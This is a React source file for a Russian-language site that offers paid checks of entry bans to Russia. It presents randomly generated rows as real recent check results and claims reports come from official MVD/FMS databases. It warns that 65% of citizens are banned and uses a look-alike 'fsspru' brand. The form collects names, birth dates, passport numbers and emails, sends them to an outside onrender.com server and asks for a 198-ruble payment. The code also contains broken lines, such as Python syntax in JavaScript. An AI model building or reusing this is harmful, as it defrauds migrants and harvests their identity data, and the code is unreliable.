import React, { useState, useEffect } from 'react';
import { Link } from 'react-router-dom';
import a1 from "./assets/documents/report.pdf";
import a2 from "./assets/images/spravka.png";

const StepCard = ({ number, text }) => {
  return (
    <div className="step-card">
      <div className="step-number">{number}</div>
      <p>{text}</p>
    </div>
  );
};

const generateRandomData = (count) => {
  const regions = ["Московская область", "Республика Бурятия", "Краснодарский край", "Челябинская область"];
  const results = ["Въезд запрещен!", "Разрешен"];
  const names = ["Иванов", "Петров", "Сидоров", "Козлов"];
  const initials = ["П.В.", "И.И.", "А.М.", "Д.С."];

  const getRandomDate = () => {
    const start = new Date(1970, 0, 1);
    const end = new Date(2005, 11, 31);
    const date = new Date(start.getTime() + Math.random() * (end.getTime() - start.getTime()));
    return date.toISOString().split('T')[0];
  };

  const getRandomRequestDateTime = () => {
    const now = new Date();
    const start = new Date(now.getTime() - 24 * 60 * 60 * 1000);
    const date = new Date(start.getTime() + Math.random() * (now.getTime() - start.getTime()));
    return date.toLocaleString('ru-RU', {
      day: '2-digit',
      month: '2-digit',
      year: 'numeric',
      hour: '2-digit',
      minute: '2-digit'
    }).replace(',', '');
  };

  return Array.from({ length: count }, () => ({
    fullName: `****${names[Math.floor(Math.random() * names.length)]} ${initials[Math.floor(Math.random() * initials.length)]}`,
    region: regions[Math.floor(Math.random() * regions.length)],
    dob: getRandomDate(),
    requestDateTime: getRandomRequestDateTime(),
    result: results[Math.floor(Math.random() * results.length)]
  }));
};

function RandomCheckTable() {
  const [tableData] = useState(generateRandomData(5));

  return (
    <div className="random-check-table">
      <table>
        <thead>
          <tr>
            <th className="random-check-table-th">ФИО</th>
            <th>Регион проверки</th>
            <th>Дата рождения</th>
            <th>Дата и время запроса</th>
            <th className="random-check-table-th2">Результат проверки</th>
          </tr>
        </thead>
        <tbody>
          {tableData.map((row, index) => (
            <tr key={index}>
              <td>{row.fullName}</td>
              <td>{row.region}</td>
              <td>{row.dob}</td>
              <td>{row.requestDateTime}</td>
              <td className={row.result === "Въезд запрещен!" ? "result-denied" : "result-allowed"}>{row.result}</td>
            </tr>
          ))}
        </tbody>
      </table>
    </div>
  );
}

function FullNameInput({ onValidChange, onChange }) {
  const [fullName, setFullName] = useState('');
  const [error, setError] = useState('');

  const validate = (value) => {
    const words = value.trim().split(/\s+/);
    const onlyLetters = /^[А-Яа-яЁёA-Za-z\s\-]+$/;

    if (!value) {
      return 'Введите ФИО';
    } else if (!onlyLetters.test(value)) {
      return 'Только буквы, пробелы, дефисы';
    } else if (words.length !== 3) {
      return 'Фамилия, имя, отчество';
    } else {
      return '';
    }
  };

  const handleChange = (e) => {
    const value = e.target.value;
    setFullName(value);
    const errorText = validate(value);
    setError(errorText);
    if (onValidChange) {
      onValidChange(errorText === '');
    }
    if (onChange) {
      onChange(value);
    }
  };

  return (
    <div className="form-group">
      <label>Укажите ваше ФИО</label>
      <input
        type="text"
        placeholder="Иванов Иван Иванович"
        className={`form-input ${error ? 'is-invalid' : ''}`}
        value={fullName}
        onChange={handleChange}
      />
      {error && <div style={{ color: '#d32f2f', fontSize: '12px', marginTop: '6px' }}>{error}</div>}
    </div>
  );
}

function StepTwoForm({ onValidChange, onDataChange }) {
  const [citizenship, setCitizenship] = useState('');
  const [documentType, setDocumentType] = useState('');
  const [documentNumber, setDocumentNumber] = useState('');
  const [validityDate, setValidityDate] = useState('');
  const [errors, setErrors] = useState({});

  const validate = () => {
    const newErrors = {};
    if (!citizenship) newErrors.citizenship = 'Выберите гражданство';
    if (!documentType) newErrors.documentType = 'Выберите тип документа';
    if (!documentNumber) {
      newErrors.documentNumber = 'Введите номер документа';
    } else if (!/^[A-Za-z0-9]+$/.test(documentNumber)) {
      newErrors.documentNumber = 'Только буквы и цифры';
    }
    if (!validityDate) newErrors.validityDate = 'Выберите дату';

    setErrors(newErrors);
    const isValid = Object.keys(newErrors).length === 0;
    if (onValidChange) {
      onValidChange(isValid);
    }
    if (onDataChange && isValid) {
      onDataChange({ citizenship, documentType, documentNumber, validityDate });
    }
    return isValid;
  };

  const handleChange = (field, value) => {
    switch (field) {
      case 'citizenship':
        setCitizenship(value);
        break;
      case 'documentType':
        setDocumentType(value);
        break;
      case 'documentNumber':
        setDocumentNumber(value);
        break;
      case 'validityDate':
        setValidityDate(value);
        break;
      default:
        break;
    }
    validate();
  };

  return (
    <div className="form-row">
      <div className="form-group">
        <label>Гражданство</label>
        <select
          className={`form-select ${errors.citizenship ? 'is-invalid' : ''}`}
          value={citizenship}
          onChange={(e) => handleChange('citizenship', e.target.value)}
        >
          <option value="">Выберите гражданство</option>
          <option value="RU">Россия</option>
          <option value="BY">Беларусь</option>
          <option value="KZ">Казахстан</option>
          <option value="UA">Украина</option>
        </select>
        {errors.citizenship && (
          <div style={{ color: '#d32f2f', fontSize: '12px', marginTop: '6px' }}>{errors.citizenship}</div>
        )}
      </div>
      <div className="form-group">
        <label>Тип документа</label>
        <select
          className={`form-select ${errors.documentType ? 'is-invalid' : ''}`}
          value={documentType}
          onChange={(e) => handleChange('documentType', e.target.value)}
        >
          <option value="">Выберите тип документа</option>
          <option value="passport">Паспорт</option>
          <option value="id">ID-карта</option>
          <option value="visa">Виза</option>
        </select>
        {errors.documentType && (
          <div style={{ color: '#d32f2f', fontSize: '12px', marginTop: '6px' }}>{errors.documentType}</div>
        )}
      </div>
      <div className="form-group">
        <label>Номер документа</label>
        <input
          type="text"
          placeholder="123456789"
          className={`form-input ${errors.documentNumber ? 'is-invalid' : ''}`}
          value={documentNumber}
          onChange={(e) => handleChange('documentNumber', e.target.value)}
        />
        {errors.documentNumber && (
          <div style={{ color: '#d32f2f', fontSize: '12px', marginTop: '6px' }}>{errors.documentNumber}</div>
        )}
      </div>
      <div className="form-group">
        <label>Дата действительности документа</label>
        <input
          type="date"
          className={`form-input ${errors.validityDate ? 'is-invalid' : ''}`}
          value={validityDate}
          onChange={(e) => handleChange('validityDate', e.target.value)}
        />
        {errors.validityDate && (
          <div style={{ color: '#d32f2f', fontSize: '12px', marginTop: '6px' }}>{errors.validityDate}</div>
        )}
      </div>
      <button type="submit" className="button1" disabled={!Object.keys(errors).length === 0}>
        Следующий шаг <span style={{ fontSize: '18px', fontWeight: 'bold' }}>›</span>
      </button>
    </div>
  );
}

function StepThreeForm({ fullName, dob, stepTwoData, onBack, gender }) {
  const [operatorId] = useState('2426025');
  const [email, setEmail] = useState('');
  const [emailError, setEmailError] = useState('');
  const [isAgreed, setIsAgreed] = useState(false);

  const validateEmail = (value) => {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!value) {
      return 'Введите email';
    } else if (!emailRegex.test(value)) {
      return 'Введите корректный email';
    }
    return '';
  };

  const handleEmailChange = (e) => {
    const value = e.target.value;
    setEmail(value);
    const error = validateEmail(value);
    setEmailError(error);
  };

  const handleConfirm = async () => {
    const error = validateEmail(email);
    if (error) {
      setEmailError(error);
      return;
    }
    if (!isAgreed) {
      alert('Пожалуйста, согласитесь с политикой конфиденциальности и пользовательским соглашением.');
      return;
    }

    const timestamp = new Date().toLocaleString('ru-RU', {
      day: '2-digit',
      month: '2-digit',
      year: 'numeric',
      hour: '2-digit',
      minute: '2-digit',
      timeZone: 'Asia/Yekaterinburg'
    }).replace(',', '');

    const formData = {
      fullName,
      gender,
      dob,
      citizenship: stepTwoData.citizenship,
      documentType: stepTwoData.documentType,
      documentNumber: stepTwoData.documentNumber,
      validityDate: stepTwoData.validityDate,
      email,
      timestamp,
      country: "RF"
    };

    try {
      const response = await fetch('https://khachyerem-github-io-4.onrender.com/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(formData)
      });
      const result = await response.json();
      if (result.message) {
        alert(`Проверка завершена. Отчет будет отправлен на вашу электронную почту: ${email}`);
      } else {
        alert('Ошибка при отправке запроса: ' + result.error);
      }
    } catch (error) {
      alert('Ошибка сети: ' + error.message);
    }
  };

  return (
    <div className="form-row">
      <div className="form-group" style={{ width: '100%', padding: '20px', background: '#f5f5f5', borderRadius: '8px', height: '300px', width: '1075px' }}>
        <div style={{ margin: '20px 0' }}>
          <label>Отчет №: {operatorId}</label><br/>
          <label>Отправить на Email:</label>
          <input
            type="email"
            placeholder="example@gmail.com"
            value={email}
            onChange={handleEmailChange}
            style={{ width: '100%', padding: '8px', margin: '5px 0' }}
            className={`form-input ${emailError ? 'is-invalid' : ''}`}
          />
          {emailError && <div style={{ color: '#d32f2f', fontSize: '12px', marginTop: '6px' }}>{emailError}</div>}
        </div>
        <div style={{ display: 'flex', justifyContent: 'space-between' }}>
          <button className="button1" onClick={onBack} style={{ marginRight: '10px' }}>
            Назад <span style={{ fontSize: '18px', fontWeight: 'bold' }}>‹</span>
          </button>
          <button
            className="button1"
            onClick={handleConfirm}
            disabled={!!emailError || !email || !isAgreed}
          >
            Подтвердить оплату — 198 Р
          </button>
        </div>
        <div style={{ marginTop: '10px' }}>
          <input
            type="checkbox"
            checked={isAgreed}
            onChange={(e) => setIsAgreed(e.target.checked)}
          /> Согласен(-а) с политикой конфиденциальности и пользовательским соглашением
        </div>
      </div>
    </div>
  );
}

function Main() {
  const [isNameValid, setIsNameValid] = useState(false);
  const [showCookieNotice, setShowCookieNotice] = useState(true);
  const [currentStep, setCurrentStep] = useState(1);
  const [isStepTwoValid, setIsStepTwoValid] = useState(false);
  const [formData, setFormData] = useState({ fullName: '', dob: '', gender: '', stepTwoData: {} });
  const [showChat, setShowChat] = useState(false); 
  const [messages, setMessages] = useState([]); 
  const [newMessage, setNewMessage] = useState('');

  useEffect(() => {
    if (showChat) {
      const fetchMessages = async () => {
        try {
          const response = await fetch('https://khachyerem-github-io-4.onrender.com/messages');
          const data = await response.json();
          setMessages(data);
        } catch (error) {
          console.error('Ошибка загрузки сообщений:', error);
        }
      };
      fetchMessages();

      const interval = setInterval(fetchMessages, 5000);
      return () => clearInterval(interval);
    }
  }, [showChat]);

  const handleCookieAccept = () => {
    setShowCookieNotice(false);
  };

  const handleNextStep = (e) => {
    e.preventDefault();
    if (currentStep === 1 && isNameValid) {
      setCurrentStep(2);
    } else if (currentStep === 2 && isStepTwoValid) {
      setCurrentStep(3);
    }
  };

  const handleBack = () => {
    setCurrentStep(currentStep - 1);
  };

  const updateFormData = (data) => {
    setFormData((prev) => ({ ...prev, ...data }));
  };

  const handleSendMessage = async () => {
    if (!newMessage.trim()) return;

    const message = {
      id: Date.now().toString(),
      sender: 'user',
      text: newMessage,
      timestamp: new Date().toLocaleString('ru-RU', {
        day: '2-digit',
        month: '2-digit',
        year: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
        timeZone: 'Asia/Yekaterinburg'
      }).replace(',', ''),
      userId: formData.userId || str(uuid.uuid4()) // Добавляем userId, если отсутствует
    };

    try {
      await fetch('https://khachyerem-github-io-4.onrender.com/send_message', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(message)
      });
      setMessages([...messages, message]);
      setNewMessage('');
    } catch (error) {
      console.error('Ошибка отправки сообщения:', error);
    }
  };

  return (
    <div className="entry-ban-container">
      <nav className="navbar navbar-expand-lg bg-body-tertiary">
        <div className="container-fluid">
          <p className="navbar-brand">Название Компании</p>
          <button
            className="navbar-toggler"
            type="button"
            data-bs-toggle="collapse"
            data-bs-target="#navbarText"
            aria-controls="navbarText"
            aria-expanded="false"
            aria-label="Toggle navigation"
          >
            <span className="navbar-toggler-icon"></span>
          </button>
          <div className="collapse navbar-collapse" id="navbarText">
            <ul className="navbar-nav me-auto mb-2 mb-lg-0">
              <p className="nav-item">
                <Link className="nav-link active nav-item-p" aria-current="page" to="/">Въезд в РФ</Link>
              </p>
              <p className="nav-item lili">
                <Link className="nav-link" to="/belarus">Въезд в Беларусь</Link>
              </p>
            </ul>
            <span className="navbar-text">8 (800) 350 34 86</span>
          </div>
        </div>
      </nav>
      <section className="form-section">
        <div className="step-indicator">
          <span className="step-text">ШАГ {currentStep} / 3</span>
        </div>
        <h1 className="main-title">
          <span className="highlight">ПРОВЕРКА ЗАПРЕТА</span> НА ВЪЕЗД В РФ
        </h1>
        <p className="description">
          Для проверки запрета или ограничений заполните данные ниже. Отчет будет сформирован из официальных баз данных МВД, ФМС. Формирование
          регламентируется ФЗ 109: «О миграционном учете иностранных граждан и лиц без гражданства в Российской Федерации»
        </p>
        <form className="ban-form" onSubmit={handleNextStep}>
          {currentStep === 1 && (
            <div className="form-row">
              <FullNameInput onValidChange={setIsNameValid} onChange={(value) => updateFormData({ fullName: value })} />
              <div className="form-group">
                <label>Ваш пол</label>
                <select 
                  className="form-select" 
                  defaultValue=""
                  onChange={(e) => updateFormData({ gender: e.target.value })}
                >
                  <option disabled value="">Выберите пол</option>
                  <option value="male">Мужской</option>
                  <option value="female">Женский</option>
                </select>
              </div>
              <div className="form-group">
                <label>Дата рождения</label>
                <input type="date" className="form-input" onChange={(e) => updateFormData({ dob: e.target.value })} />
              </div>
              <button type="submit" className="button1" disabled={!isNameValid}>
                Следующий шаг <span style={{ fontSize: '18px', fontWeight: 'bold' }}>›</span>
              </button>
            </div>
          )}
          {currentStep === 2 && <StepTwoForm onValidChange={setIsStepTwoValid} onDataChange={(data) => updateFormData({ stepTwoData: data })} />}
          {currentStep === 3 && (
            <StepThreeForm 
              fullName={formData.fullName} 
              dob={formData.dob} 
              stepTwoData={formData.stepTwoData} 
              onBack={handleBack}
              gender={formData.gender}
            />
          )}
        </form>
        <div className="info-block">
          <p>
            ФЗ 109: «О миграционном учете иностранных граждан и лиц без гражданства в Российской Федерации», каждый иностранный гражданин вправе въехать
            на территорию Российской Федерации, за исключением ряда случаев. Для проверки каждого иностранного гражданина доступна онлайн проверка запрета
            въезда на территорию РФ.
          </p>
        </div>
      </section>

      <section className="stats-section">
        <div className="stats-header">
          <h2>СТАТИСТИКА ПРОВЕРОК ЗАПРЕТА ВЪЕЗДА В РФ</h2>
        </div>
        <p className="stats-description">
          Статистика обновляется каждые 20 минут. Данные формируются исходя из данных проверок, совершенных на нашем портале за последние 24 часа.
        </p>
        <RandomCheckTable />
      </section>

      {showCookieNotice && (
        <div className="cookie-notice">
          <div className="cookie-content">
            <div className="cookie-icon">🍪</div>
            <div className="cookie-text">
              <h3>Этот сайт использует файлы cookie</h3>
              <p>Мы используем файлы cookie, чтобы улучшить ваш опыт. Продолжая использовать сайт, вы соглашаетесь с нашей политикой использования cookie.</p>
              <button className="cookie-btn" onClick={handleCookieAccept}>
                Принять
              </button>
            </div>
          </div>
        </div>
      )}

      <div className="report-wrapper">
        <div className="report-container">
          <div className="report-image">
            <img src={a2} alt="" />
            <a href={a1} className="report-image-a" download="report.pdf">
              Смотреть пример 📑
            </a>
          </div>
          <div className="report-text">
            <h2>ПРИМЕР СПРАВКИ “РАЗРЕШЕНИЕ НА ВЪЕЗД В РФ”</h2>
            <p className="report-text-p">
              Пример сформированного отчета сервисом fsspru, в отчете отражено как приставы наложили ограничения на выезд за границу, все данные являются
              вымышленными любые совпадения с реальными людьми случайны
            </p>
            <div className="report-result">
              <h3>РЕЗУЛЬТАТ ПРОВЕРКИ</h3>
              <p className="report-text-p">Согласно данным полученным в МВД от 12.04.2020 в 12:48</p>
              <p className="report-text-p">Гражданину: Иванову Ивану Ивановичу</p>
              <p className="report-text-p">Дата рождения: 12.04.1967 г.р.</p>
              <p className="report-text-p">Регион: Московская область</p>
              <p className="report-text-p">
                <a href="#" className="report-check-link">Въезд в РФ: Разрешен</a>
              </p>
            </div>
            <div className="report-result2">
              <p className="report-note">
                Согласно статистике ФМС – 65% граждан имеют запрет на въезд на территорию РФ. Рекомендуем произвести проверку.
              </p>
              <a href="#" className="report-check-link">Сделать проверку</a>
            </div>
          </div>
        </div>
      </div>

      <div className="app-container2">
        <h1 className="main-title">
          <span className="highlight">КАК ПРОВЕРИТЬ</span> НА ВЪЕЗД НА ГРАНИЦУ РФ
        </h1>
        <p className="description">Для проверки ограничений на въезд в РФ отправьте онлайн заявку в базу ФМС.</p>
        <p className="description2">
          Если Вам потребуется справка для подтверждения возможности (разрешения) въезда на территорию Российской Федерации, вы сможете получить ее на
          последнем шаге.
        </p>
        <p className="description2">
          Если у вас остались вопросы, вы можете задать их отправив письмо на адрес электронной почты info@fsspru.net
        </p>
        <div className="app-container">
          <StepCard number="1" text="Укажите в заявке свои данные, которые указаны выше в форме." />
          <StepCard number="2" text="Рекомендуется указывать полный список данных, бывают совпадения по ФИО по разным регионам." />
          <StepCard number="3" text="Дождитесь обработки данных из базы ФМС, это займет не более 5 минут." />
        </div>
      </div>

      <button
        className="chat-button"
        onClick={() => setShowChat(!showChat)}
        style={{
          position: 'fixed',
          bottom: '20px',
          left: '20px',
          width: '50px',
          height: '50px',
          borderRadius: '50%',
          backgroundColor: '#007bff',
          color: 'white',
          border: 'none',
          cursor: 'pointer',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          fontSize: '24px',
          zIndex: 1000
        }}
      >
        💬
      </button>

      {showChat && (
        <div
          className="chat-window"
          style={{
            position: 'fixed',
            bottom: '80px',
            left: '20px',
            width: '300px',
            height: '400px',
            backgroundColor: '#fff',
            borderRadius: '10px',
            boxShadow: '0 2px 10px rgba(0,0,0,0.1)',
            display: 'flex',
            flexDirection: 'column',
            zIndex: 1000
          }}
        >
          <div
            style={{
              backgroundColor: '#007bff',
              color: 'white',
              padding: '10px',
              borderTopLeftRadius: '10px',
              borderTopRightRadius: '10px',
              display: 'flex',
              justifyContent: 'space-between',
              alignItems: 'center'
            }}
          >
            <span>Чат с менеджером</span>
            <button
              onClick={() => setShowChat(false)}
              style={{ background: 'none', border: 'none', color: 'white', cursor: 'pointer' }}
            >
              ✕
            </button>
          </div>
          <div
            style={{
              flex: 1,
              padding: '10px',
              overflowY: 'auto',
              display: 'flex',
              flexDirection: 'column',
              gap: '10px'
            }}
          >
            {messages.map((msg) => (
              <div
                key={msg.id}
                style={{
                  alignSelf: msg.sender === 'user' ? 'flex-end' : 'flex-start',
                  backgroundColor: msg.sender === 'user' ? '#007bff' : '#e9ecef',
                  color: msg.sender === 'user' ? 'white' : 'black',
                  padding: '8px 12px',
                  borderRadius: '10px',
                  maxWidth: '70%'
                }}
              >
                <div>{msg.text}</div>
                <div style={{ fontSize: '10px', marginTop: '5px', opacity: 0.7 }}>
                  {msg.timestamp}
                </div>
              </div>
            ))}
          </div>
          <div style={{ padding: '10px', display: 'flex', gap: '10px', borderTop: '1px solid #ddd' }}>
            <input
              type="text"
              value={newMessage}
              onChange={(e) => setNewMessage(e.target.value)}
              placeholder="Введите сообщение..."
              style={{ flex: 1, padding: '8px', borderRadius: '5px', border: '1px solid #ddd' }}
            />
            <button
              onClick={handleSendMessage}
              style={{
                padding: '8px 16px',
                backgroundColor: '#007bff',
                color: 'white',
                border: 'none',
                borderRadius: '5px',
                cursor: 'pointer'
              }}
            >
              Отправить
            </button>
          </div>
        </div>
      )}
    </div>
  );
}

export default Main;
